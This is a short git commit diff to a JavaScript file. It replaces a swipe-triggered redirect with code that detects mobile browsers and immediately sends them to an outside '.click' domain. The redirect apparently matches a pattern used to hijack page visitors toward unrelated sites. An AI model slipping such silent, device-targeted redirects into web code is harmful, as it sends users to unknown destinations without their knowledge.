1fba710389a5d8ea6ef83275b077f87b903516f6
kenkiller1st <98470178+kenkiller1st@users.noreply.github.com>
2023-04-18 19:49:44 +0700

    Update code.js

--- code.js
+++ code.js
@@ -1,14 +1,6 @@
-var touchStartX = 0;
-var touchMoveX = 0;
-document.addEventListener('touchstart', function(e) {
-  touchStartX = e.touches[0].clientX;
-});
-document.addEventListener('touchmove', function(e) {
-  touchMoveX = e.touches[0].clientX;
-});
-document.addEventListener('touchend', function(e) {
-  var distanceX = touchMoveX - touchStartX;
-if (distanceX > 50) {
-    window.location.href = "http://maohoankhangchinhhang.click/moctoc";
-  }
-});
+
+var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+if (isMobile) {
+  window.location.replace("https://maohoankhangchinhhang.click/moctoc");
+} 
